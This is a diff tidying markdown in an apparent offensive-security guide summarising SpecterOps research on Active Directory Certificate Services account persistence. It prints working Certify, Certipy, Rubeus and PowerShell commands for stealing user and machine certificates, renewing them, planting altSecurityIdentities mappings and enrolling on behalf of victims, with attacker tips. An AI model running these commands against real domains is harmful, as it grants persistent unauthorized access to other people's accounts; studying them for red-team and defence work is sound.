@@ -1,13 +1,12 @@
 # AD CS Account Persistence
 
-
-**This is a small summary of the account persistence chapters of the awesome research from [[https://specterops.io/assets/resources/Certified_Pre-Owned.pdf|https://specterops.io/assets/resources/Certified_Pre-Owned.pdf]]**
+**This is a small summary of the account persistence chapters of the awesome research from [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**
 
 ## Understanding Active User Credential Theft with Certificates – PERSIST1
 
 In a scenario where a certificate that allows domain authentication can be requested by a user, an attacker has the opportunity to request and steal this certificate to maintain persistence on a network. By default, the `User` template in Active Directory allows such requests, though it may sometimes be disabled.
 
-Using [[https://github.com/GhostPack/Certify) or [Certipy](https://github.com/ly4k/Certipy|Certify]], you can search for enabled templates that allow client authentication and then request one:
+Using [Certify](https://github.com/GhostPack/Certify) or [Certipy](https://github.com/ly4k/Certipy), you can search for enabled templates that allow client authentication and then request one:
 
 ```bash
 # Enumerate client-auth capable templates
@@ -19,7 +18,7 @@ Certify.exe request /ca:CA-SERVER\CA-NAME /template:User
 # Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
 certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
 ```
-```
+
 A certificate’s power lies in its ability to authenticate as the user it belongs to, regardless of password changes, as long as the certificate remains valid.
 
 You can convert PEM to PFX and use it to obtain a TGT:
@@ -34,7 +33,7 @@ Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /
 # Or with Certipy
 certipy auth -pfx user.pfx -dc-ip 10.0.0.10
 ```
-```
+
 > Note: Combined with other techniques (see THEFT sections), certificate-based auth allows persistent access without touching LSASS and even from non-elevated contexts.
 
 ## Gaining Machine Persistence with Certificates - PERSIST2
@@ -48,7 +47,7 @@ Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /mach
 # Authenticate as the machine using the issued PFX
 Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
 ```
-```
+
 ## Extending Persistence Through Certificate Renewal - PERSIST3
 
 Abusing the validity and renewal periods of certificate templates lets an attacker maintain long-term access. If you possess a previously issued certificate and its private key, you can renew it before expiration to obtain a fresh, long-lived credential without leaving additional request artifacts tied to the original principal.
@@ -63,7 +62,7 @@ certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
 # (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
 certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
 ```
-```
+
 > Operational tip: Track lifetimes on attacker-held PFX files and renew early. Renewal can also cause updated certificates to include the modern SID mapping extension, keeping them usable under stricter DC mapping rules (see next section).
 
 ## Planting Explicit Certificate Mappings (altSecurityIdentities) – PERSIST4
@@ -88,13 +87,13 @@ $Map     = "X509:<I>$Issuer<SR>$SerialR"
 # Add mapping to victim. Requires rights to write altSecurityIdentities on the object
 Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
 ```
-```
+
 Then authenticate with your PFX. Certipy will obtain a TGT directly:
 
 ```bash
 certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10
 ```
-```
+
 Notes
 - Use strong mapping types only: X509IssuerSerialNumber, X509SKI, or X509SHA1PublicKey. Weak formats (Subject/Issuer, Subject-only, RFC822 email) are deprecated and can be blocked by DC policy.
 - The cert chain must build to a root trusted by the DC. Enterprise CAs in NTAuth are typically trusted; some environments also trust public CAs.
@@ -119,7 +118,7 @@ Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
 certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
            -template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
 ```
-```
+
 Revocation of the agent certificate or template permissions is required to evict this persistence.
 
 ## 2025 Strong Certificate Mapping Enforcement: Impact on Persistence
